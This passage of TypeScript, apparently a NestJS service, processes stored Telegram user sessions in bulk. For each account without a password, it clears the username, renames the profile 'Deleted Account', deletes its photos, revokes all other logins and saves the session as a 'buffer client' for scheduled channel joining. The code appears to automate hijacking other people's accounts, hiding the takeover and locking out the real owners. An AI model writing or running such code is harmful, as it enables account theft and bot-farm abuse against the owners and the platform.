                        await client.updateUsername('');
                        await sleep(3000);

                        await client.updatePrivacyforDeletedAccount();
                        await sleep(3000);

                        await client.updateProfile("Deleted Account", "Deleted Account");
                        await sleep(3000);

                        await client.deleteProfilePhotos();
                        await sleep(2000);

                        await this.telegramService.removeOtherAuths(document.mobile);
                        const channels = await client.channelInfo(true);

                        this.logger.debug(`Creating buffer client document for ${document.mobile}`);
                        const bufferClient: CreateBufferClientDto = {
                            tgId: document.tgId,
                            session: document.session,
                            mobile: document.mobile,
                            availableDate: (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0],
                            channels: channels.ids.length,
                            status: 'active',
                        };

                        await sleep(1000);
                        await this.create(bufferClient);

                        await sleep(1000);
                        await this.usersService.update(document.tgId, { twoFA: true });

                        this.logger.debug(`Created BufferClient for ${document.mobile}`);
                        badIds.pop();
                    } else {
                        this.logger.debug(`Failed to Update as BufferClient as ${document.mobile} already has Password`);
                        await sleep(1000);
                        await this.usersService.update(document.tgId, { twoFA: true });
                    }
                } catch (error: any) {
                    this.logger.error(`Error processing client ${document.mobile}: ${error.message}`);
                    parseError(error);
                } finally {
                    try {
                        await connectionManager.unregisterClient(document.mobile);
                        await sleep(1500); // Delay after unregistering
                    } catch (unregisterError: any) {
                        this.logger.error(`Error unregistering client ${document.mobile}: ${unregisterError.message}`);
                    }
                }
            } catch (error: any) {
                this.logger.error(`Error creating client connection for ${document.mobile}: ${error.message}`);
                parseError(error);
            }

            // Add significant delay between processing each new user
            if (badIds.length > 0 && documents.length > 0) {
                await sleep(8000); // 8 seconds between each new user processing
            }
        }

        // Schedule next join channel process with delay
        this.createTimeout(() => {
            this.logger.log('Starting next join channel process after adding new users');
            this.joinchannelForBufferClients();
        }, 5 * 60 * 1000); // 5 minutes delay
    }
}
